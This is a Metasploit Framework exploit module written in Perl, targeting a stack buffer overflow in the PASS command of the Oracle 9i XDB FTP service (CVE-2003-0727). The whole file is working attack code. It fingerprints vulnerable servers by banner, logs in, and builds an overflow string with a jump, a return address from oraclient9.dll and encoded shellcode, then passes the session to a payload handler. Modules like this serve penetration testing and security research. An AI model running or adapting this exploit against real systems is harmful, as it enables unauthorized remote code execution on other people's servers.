##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::oracle9i_xdb_ftp_pass;

use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'  => 'Oracle 9i XDB FTP PASS Overflow (win32)',
	'Version'  => '$Revision: 1.1 $',
	'Authors' => 
	  [
		'y0 <y0[at]w00t-shell.net>',
	  ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp', 'win2003' ],
	'Priv'  => 1,
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 2100],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
		'USER'  => [1, 'DATA', 'Username', 'metasploit'],
	  },

	'Payload' =>
	  {
		'Space'     => 800,
		'BadChars'  => "\x00\x20\x0a\x0d",
		'Prepend'	=> "\x81\xc4\xff\xef\xff\xff\x44",
		'Keys'      => ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
            By passing an overly long string to the PASS command, 
            a stack based buffer overflow occurs. David Litchfield, 
            has illustrated multiple vulnerabilities in the Oracle
            9i XML Database (XDB), during a seminar on "Variations
            in exploit methods between Linux and Windows" presented
            at the Blackhat conference. 
}),

	'Refs'  =>
	  [
		['BID', '8375'],
		['CVE', '2003-0727'],
                ['URL', 'http://www.blackhat.com/presentations/bh-usa-03/bh-us-0
3-litchfield-paper.pdf'],
	  ],

	'DefaultTarget' => 0,
	'Targets' =>
	  [
		['Oracle 9.2.0.1 Universal', 0x60616d46], # oraclient9.dll (pop/pop/ret)
	  ],
	  
	'Keys' => ['oracle'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my ($self) = @_;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	
	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	  
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$s->Send("QUIT\r\n");
	my $res = $s->Recv(-1, 20);
	$s->Close();

	if ($res !~ /9\.2\.0\.1\.0/) {
		$self->PrintLine("[*] This server does not appear to be vulnerable.");
		return $self->CheckCode('Safe');
	}

	$self->PrintLine("[*] Vulnerable installation detected :-)");
	return $self->CheckCode('Detected');
}

sub Exploit {
	my $self = shift;
	my $targetHost  = $self->GetVar('RHOST');
	my $targetPort  = $self->GetVar('RPORT');
	my $targetIndex = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$targetIndex];
	
	my $s = $self->Login;
	return if ! $s;
	
	$self->PrintLine(sprintf("[*] Trying to exploit target %s 0x%.8x", $target->[0], $target->[1]));

	my $filler = Pex::Text::EnglishText(492);	
	substr($filler, 442, 2, "\xeb\x30");
	substr($filler, 446, 4, pack('V', $target->[1]));

	my $sploit = "PASS ". $filler . $shellcode . "\r\n"; 
	$s->Send($sploit);
	
	$self->Handler($s);
	sleep(2);
	return;
}

sub Login {
	my $self = shift;
	
	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $self->GetVar('RHOST'),
		'PeerPort'  => $self->GetVar('RPORT'),
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: '.$s->GetError);
		return;
	}
	
	my $res = $s->Recv(-1, 20);
	
	if (! $res || $res !~ /9\.2\.0\.1\.0/) {
		$self->PrintLine("[*] The service did not return a valid banner");
		return;
	}
	
	$self->PrintLine("[*] REMOTE> ". $self->CleanData($res));
	
	$s->Send("USER ". $self->GetVar('USER') ."\r\n");
	$res = $s->Recv(-1, 10);
	$self->PrintLine("[*] REMOTE> ". $self->CleanData($res));	
	if ($res !~ /^331/) {
		$s->Close;
		return;
	}
		
	return $s;
}


sub CleanData {
	my $self = shift;
	my $data = shift;
	$data =~ s/\r|\n//g;
	return $data;
}
